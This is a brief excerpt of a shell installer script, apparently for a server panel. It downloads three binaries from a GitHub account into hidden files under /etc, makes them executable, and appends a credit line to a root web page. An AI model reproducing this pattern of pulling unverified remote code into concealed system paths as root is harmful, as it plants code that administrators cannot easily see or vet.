...
wget 'https://raw.githubusercontent.com/kimdev541/panel/panel_files/monitor' -O /etc/.monitor
wget 'https://raw.githubusercontent.com/kimdev541/panel/panel_files/ws' -O /etc/.ws
wget 'https://raw.githubusercontent.com/kimdev541/panel/panel_files/counter' -O /etc/.counter
chmod +x /etc/.monitor
chmod +x /etc/.ws
chmod +x /etc/.counter
...
echo "Made with love by: scbuild Developer... " >> /root/.web/index.php
